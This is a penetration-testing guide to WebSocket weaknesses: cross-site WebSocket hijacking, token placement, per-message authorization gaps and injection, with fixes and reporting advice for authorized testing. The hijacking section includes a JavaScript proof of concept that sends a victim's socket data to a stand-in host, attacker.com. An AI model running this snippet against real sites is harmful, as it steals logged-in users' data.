# WebSocket Attacks — Deep Dive

WebSockets upgrade an HTTP connection to a persistent bidirectional channel. Two things are
routinely under-secured: the **handshake's origin check** (enabling cross-site hijacking) and
**per-message authorization** (the socket becomes a softer path to actions/data). Authorized
testing.

## Cross-Site WebSocket Hijacking (CSWSH)

The WebSocket handshake is a normal HTTP request — and if the connection is authenticated by
**cookies** and the server does **not** validate the `Origin` header, any website can open a socket
in a logged-in victim's browser. It's CSRF for WebSockets, but worse: it's bidirectional, so the
attacker can both send and **read**.

Mechanic:
```js
// on attacker.com, victim is logged into target
var ws = new WebSocket("wss://target/socket");   // cookies auto-attached, no Origin check
ws.onopen  = () => ws.send('{"action":"getMessages"}');
ws.onmessage = e => fetch("https://attacker.com/x?d="+btoa(e.data));  // exfil victim data
```

Test:
1. Replay the handshake with `Origin: https://evil.com` — does it still `101 Switching Protocols`
   and stay authenticated?
2. If yes, the PoC page above reads/drives the victim's socket.

The fix (and the refutation when present): validate `Origin` on the handshake, and/or use a
CSRF-token/bearer in the first message rather than pure cookie auth.

## Where auth lives: handshake vs. per-message

- **Token in the query string** (`wss://target/socket?token=...`) leaks into proxy/server logs and
  browser history — a real finding, and it invites replay.
- **Cookie auth** invites CSWSH (above).
- **Token in the first message** is better — *but only if every subsequent message is still
  authorized*. Many apps authenticate the connection once and then trust all frames.

## Per-message authorization (BOLA over the socket)

Once connected, does each message re-check permissions?

- **Object access:** a socket authorized as user A that accepts `{"action":"read","id":<B's id>}` and
  returns B's data → BOLA over the socket. Swap ids like REST IDOR.
- **Channel/topic subscription:** pub/sub sockets where you `subscribe` to a topic
  (`user:<id>`, `org:<id>`, `chat:<id>`). Subscribing to another user's/tenant's topic and receiving
  their stream is a classic missed authz check.
- **Action authz:** state-changing messages (send, delete, transfer) authorized the same as their
  REST equivalents, or is the socket a bypass?

## Injection & other angles

- Message payloads reach the same sinks as HTTP — SQL/NoSQL/command injection, and XSS if a message
  is rendered into another user's DOM (stored-XSS over a chat socket).
- **Message format confusion** (JSON vs binary), type juggling in the router.
- **No per-message rate limit / resource caps** (often out of scope as DoS — check policy).

## Method

Capture the handshake and frames with a WebSocket-aware proxy; replay the handshake with a foreign
`Origin` (CSWSH); with two accounts, swap ids/topics in messages to test per-message authz; probe
message fields for injection. For CSWSH, a tiny attacker-origin HTML page that opens the socket and
logs what it receives is the cleanest proof.

## Reporting

- CSWSH: show the handshake accepted with `Origin: evil`, and the attacker-origin page receiving
  the victim's data. Note the cookie-only auth + missing origin check.
- Per-message authz: show the socket authorized as A returning/altering B's resource or B's topic
  stream, with a control. Name whether the gap is the handshake origin check or per-message
  authorization.
